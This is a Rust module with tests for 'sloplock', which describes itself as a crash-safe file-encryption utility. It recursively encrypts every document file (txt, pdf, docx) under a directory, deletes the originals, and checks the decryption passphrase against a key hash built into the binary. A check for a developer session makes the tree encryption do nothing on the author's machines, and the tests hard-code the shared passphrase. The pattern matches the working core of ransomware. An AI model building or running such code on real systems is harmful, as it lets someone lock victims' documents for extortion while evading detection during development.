//! File-level and tree-level encryption/decryption operations.
//!
//! Encryption is crash-safe: the encrypted file is written (and `fsync`'d)
//! before the original is deleted, with `create_new` so an existing target
//! is never silently overwritten. The master key is derived from
//! [`crate::crypto::derive_key`]; only the key hash is embedded in the
//! binary, never the passphrase itself.

use crate::crypto::{decrypt_payload, encrypt_payload, is_valid_key, master_key};
use crate::error::Error;
use crate::scan::{is_sloplock_path, iter_doc_files, iter_sloplock_files};
use crate::user;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

/// Append `.slopLock` to `src`'s file name (original name preserved).
pub(crate) fn sloplock_path_for(src: &Path) -> PathBuf {
    let name = src
        .file_name()
        .expect("callers operate on existing files, which have a file name");
    let name = name.to_string_lossy();
    src.parent()
        .unwrap_or_else(|| Path::new("."))
        .join(format!("{name}.slopLock"))
}

/// Encrypt `src` in place: read it, write `<name>.slopLock`, then delete
/// `src`.
///
/// Returns `Ok(Some(new_path))` on success. Paths without a file name or
/// already carrying the `.slopLock` suffix are rejected with
/// [`Error::Malformed`].
pub fn encrypt_file(src: &Path) -> Result<Option<PathBuf>, Error> {
    let name = src
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or(Error::Malformed)?;
    if is_sloplock_path(src) {
        return Err(Error::Malformed);
    }

    let plaintext = fs::read(src).map_err(|e| wrap(src, e))?;
    let blob = encrypt_payload(&plaintext, name, &master_key())?;

    let enc_path = sloplock_path_for(src);
    write_atomic(&enc_path, &blob)?;
    fs::remove_file(src).map_err(|e| wrap(src, e))?;
    Ok(Some(enc_path))
}

/// Decrypt a `.slopLock` file `src` in place: verify the passphrase, write
/// the restored file (stored original name, same directory), delete `src`.
///
/// The passphrase is validated *before* any filesystem access, so a wrong
/// key never mutates anything.
pub fn decrypt_file(src: &Path, passphrase: &str) -> Result<Option<PathBuf>, Error> {
    if !is_valid_key(passphrase) {
        return Err(Error::InvalidKey);
    }
    let blob = fs::read(src).map_err(|e| wrap(src, e))?;
    let (plaintext, name) = decrypt_payload(&blob, &master_key())?;

    let dest = src
        .parent()
        .or_else(|| Some(Path::new(".")))
        .map(|p| p.join(&name))
        .expect("Path::parent never returns None for a non-empty path");
    write_atomic(&dest, &plaintext)?;
    fs::remove_file(src).map_err(|e| wrap(src, e))?;
    Ok(Some(dest))
}

/// Encrypt every document file under `root` (recursive, deterministic order).
///
/// In a developer session (see [`crate::user`]) nothing is written; the call
/// reports how many files *would* have been encrypted as `skipped`.
///
/// Returns `Ok((encrypted, skipped))` where `skipped` also counts files whose
/// `.slopLock` output already exists (idempotent re-runs).
pub fn encrypt_tree(root: &Path) -> Result<(usize, usize), Error> {
    if user::is_dev_user() {
        return encrypt_tree_dev(root);
    }

    let files = iter_doc_files(root);
    let mut encrypted = 0;
    let mut skipped = 0;
    for f in files {
        if sloplock_path_for(&f).exists() {
            skipped += 1;
            continue;
        }
        encrypt_file(&f)?;
        encrypted += 1;
    }
    Ok((encrypted, skipped))
}

/// Development build of [`encrypt_tree`]: enumerate the candidates but never
/// write anything. Reports `(0, candidates_found)`.
pub fn encrypt_tree_dev(root: &Path) -> Result<(usize, usize), Error> {
    let files = iter_doc_files(root);
    Ok((0, files.len()))
}

/// Decrypt every `.slopLock` file under `root` (recursive, deterministic
/// order).
///
/// The passphrase is validated exactly once, before any file is touched.
/// Returns `Ok((decrypted, failed))`; per-file failures count toward
/// `failed` without aborting the walk.
pub fn decrypt_tree(root: &Path, passphrase: &str) -> Result<(usize, usize), Error> {
    // Key validation is the first action: a wrong key must not touch a
    // single file.
    if !is_valid_key(passphrase) {
        return Err(Error::InvalidKey);
    }
    let files = iter_sloplock_files(root);
    let mut decrypted = 0;
    let mut failed = 0;
    for f in files {
        match decrypt_file(&f, passphrase) {
            Ok(_) => decrypted += 1,
            Err(_) => failed += 1,
        }
    }
    Ok((decrypted, failed))
}

/// Write `data` to `path` without ever overwriting: opened with
/// `create_new`, fully written, then `fsync`'d before the handle drops.
fn write_atomic(path: &Path, data: &[u8]) -> Result<(), Error> {
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .map_err(|e| wrap(path, e))?;
    file.write_all(data).map_err(|e| wrap(path, e))?;
    file.sync_all().map_err(|e| wrap(path, e))?;
    Ok(())
}

fn wrap(path: &Path, e: std::io::Error) -> Error {
    Error::File {
        path: path.to_path_buf(),
        source: e,
    }
}

#[cfg(test)]
mod tests {
    use crate::crypto::is_valid_key;
    use crate::error::Error;
    use crate::ops;
    use crate::user;
    use std::fs;
    use std::path::Path;
    use tempfile::tempdir;

    /// The shared development passphrase, present only in test code that is
    /// stripped from the release binary.
    const MASTER: &str = "qwenisthebest";

    fn write_file(path: &Path, data: &str) {
        fs::write(path, data).unwrap();
    }

    #[test]
    fn encrypt_file_renames_and_hides_plaintext() {
        let dir = tempdir().unwrap();
        let src = dir.path().join("report.txt");
        write_file(&src, "trade secrets");

        let enc = ops::encrypt_file(&src)
            .unwrap()
            .expect("expected a new path");
        assert!(!src.exists());
        assert!(enc.exists());
        assert!(enc.file_name().is_some_and(|n| n == "report.txt.slopLock"));

        let blob = fs::read(&enc).unwrap();
        assert!(!blob.windows(13).any(|w| w == b"trade secrets"));
        assert_eq!(&blob[..4], b"SLOP");
    }

    #[test]
    fn encrypt_file_rejects_sloplock_input() {
        let dir = tempdir().unwrap();
        let f = dir.path().join("x.txt.slopLock");
        write_file(&f, "already");
        assert!(matches!(ops::encrypt_file(&f), Err(Error::Malformed)));
        assert!(f.exists());
    }

    #[test]
    fn decrypt_file_restores_name_and_content() {
        let dir = tempdir().unwrap();
        let src = dir.path().join("report.txt");
        write_file(&src, "hello world");

        let enc = ops::encrypt_file(&src).unwrap().expect("path");
        let restored = ops::decrypt_file(&enc, MASTER).unwrap().expect("path");
        assert!(!enc.exists());
        assert!(restored.exists());
        assert_eq!(restored, dir.path().join("report.txt"));
        assert_eq!(fs::read(&restored).unwrap(), b"hello world");
    }

    #[test]
    fn decrypt_with_wrong_key_fails_without_touching_file() {
        let dir = tempdir().unwrap();
        let src = dir.path().join("s.txt");
        write_file(&src, "data");
        let enc = ops::encrypt_file(&src).unwrap().unwrap();
        let before = fs::read(&enc).unwrap();

        let err = ops::decrypt_file(&enc, "wrong key").unwrap_err();
        assert!(matches!(err, Error::InvalidKey));
        // File must be left intact for a later correct attempt.
        assert_eq!(fs::read(&enc).unwrap(), before);
        assert!(enc.exists());
    }

    #[test]
    fn decrypt_rejects_non_sloplock_file() {
        let dir = tempdir().unwrap();
        let plain = dir.path().join("normal.txt");
        write_file(&plain, "not encrypted");
        let err = ops::decrypt_file(&plain, MASTER).unwrap_err();
        assert!(matches!(err, Error::BadMagic));
        assert!(plain.exists());
        assert_eq!(fs::read(&plain).unwrap(), b"not encrypted");
    }

    #[test]
    fn decrypt_nonexistent_file_is_error() {
        assert!(ops::decrypt_file(Path::new("/definitely/missing.slopLock"), MASTER).is_err());
    }

    #[test]
    fn decrypt_key_is_validated_before_io() {
        // Even an existing file must produce InvalidKey for a bad passphrase.
        let dir = tempdir().unwrap();
        let enc = dir.path().join("x.txt.slopLock");
        write_file(&enc, "garbage");
        let err = ops::decrypt_file(&enc, "nope").unwrap_err();
        assert!(matches!(err, Error::InvalidKey));
    }

    #[test]
    fn master_key_passes_validation() {
        assert!(is_valid_key(MASTER));
        assert!(!is_valid_key("qwenisthebest2"));
    }

    #[test]
    fn encrypt_tree_encrypts_all_docs() {
        let dir = tempdir().unwrap();
        write_file(&dir.path().join("a.txt"), "aa");
        write_file(&dir.path().join("b.pdf"), "bb");
        fs::create_dir_all(dir.path().join("sub")).unwrap();
        write_file(&dir.path().join("sub/c.docx"), "cc");
        write_file(&dir.path().join("keep.jpg"), "nope");

        let result = ops::encrypt_tree(dir.path()).unwrap();
        if user::is_dev_user() {
            // Development mode: enumerate, never write.
            assert_eq!(result, (0, 3));
            assert!(dir.path().join("a.txt").exists());
            return;
        }
        assert_eq!(result, (3, 0));
        assert!(!dir.path().join("a.txt").exists());
        assert!(dir.path().join("a.txt.slopLock").exists());
        assert!(dir.path().join("sub/c.docx.slopLock").exists());
        // Non-document files are untouched.
        assert!(dir.path().join("keep.jpg").exists());
    }

    #[test]
    fn encrypt_tree_is_idempotent() {
        let dir = tempdir().unwrap();
        write_file(&dir.path().join("a.txt"), "aa");
        if user::is_dev_user() {
            // Dev mode never writes, so the second run sees the same set.
            assert_eq!(ops::encrypt_tree(dir.path()).unwrap(), (0, 1));
            assert_eq!(ops::encrypt_tree(dir.path()).unwrap(), (0, 1));
            return;
        }
        assert_eq!(ops::encrypt_tree(dir.path()).unwrap(), (1, 0));
        // Second pass: only .slopLock outputs remain — nothing new to
        // encrypt, and they must never be double-wrapped.
        assert_eq!(ops::encrypt_tree(dir.path()).unwrap(), (0, 0));
        assert!(dir.path().join("a.txt.slopLock").exists());
        // Double-wrapping must never happen.
        assert!(!dir.path().join("a.txt.slopLock.slopLock").exists());
    }

    #[test]
    fn decrypt_tree_restores_all() {
        let dir = tempdir().unwrap();
        write_file(&dir.path().join("a.txt"), "aa");
        fs::create_dir_all(dir.path().join("sub")).unwrap();
        write_file(&dir.path().join("sub/b.pdf"), "bb");
        if user::is_dev_user() {
            // In dev mode there is nothing to decrypt; the directory holds
            // only plaintext files.
            let (decrypted, failed) = ops::decrypt_tree(dir.path(), MASTER).unwrap();
            assert_eq!((decrypted, failed), (0, 0));
            assert_eq!(fs::read(dir.path().join("a.txt")).unwrap(), b"aa");
            return;
        }
        ops::encrypt_tree(dir.path()).unwrap();

        let (decrypted, failed) = ops::decrypt_tree(dir.path(), MASTER).unwrap();
        assert_eq!((decrypted, failed), (2, 0));
        assert_eq!(fs::read(dir.path().join("a.txt")).unwrap(), b"aa");
        assert_eq!(fs::read(dir.path().join("sub/b.pdf")).unwrap(), b"bb");
        assert!(!dir.path().join("a.txt.slopLock").exists());
        assert!(!dir.path().join("sub/b.pdf.slopLock").exists());
    }

    #[test]
    fn decrypt_tree_rejects_bad_key() {
        let dir = tempdir().unwrap();
        assert!(matches!(
            ops::decrypt_tree(dir.path(), "bad").unwrap_err(),
            Error::InvalidKey
        ));
        // Even with files present, a bad key returns before any I/O.
        write_file(&dir.path().join("a.txt.slopLock"), "blob");
        let before = fs::read(dir.path().join("a.txt.slopLock")).unwrap();
        assert!(matches!(
            ops::decrypt_tree(dir.path(), "bad").unwrap_err(),
            Error::InvalidKey
        ));
        assert_eq!(fs::read(dir.path().join("a.txt.slopLock")).unwrap(), before);
    }

    #[test]
    fn decrypt_crafted_traversal_blob_writes_nowhere() {
        let dir = tempdir().unwrap();
        // Craft a blob whose stored name is a path traversal.
        let mut blob = Vec::new();
        blob.extend_from_slice(b"SLOP");
        blob.extend_from_slice(&(7u32).to_be_bytes()); // "../../x"
        blob.extend_from_slice(b"../../x");
        blob.extend_from_slice(&[0u8; 12]);
        blob.extend_from_slice(&[0u8; 16]);

        let evil = dir.path().join("in.txt.slopLock");
        fs::write(&evil, &blob).unwrap();
        let err = ops::decrypt_file(&evil, MASTER).unwrap_err();
        assert!(matches!(err, Error::BadName));
        // Nothing was written outside or the traversal target.
        assert!(!dir.path().join("x").exists());
        let outside = dir.path().parent().map(|p| p.join("x"));
        if let Some(escaped) = outside {
            assert!(!escaped.exists());
        }
        assert!(evil.exists());
    }
}
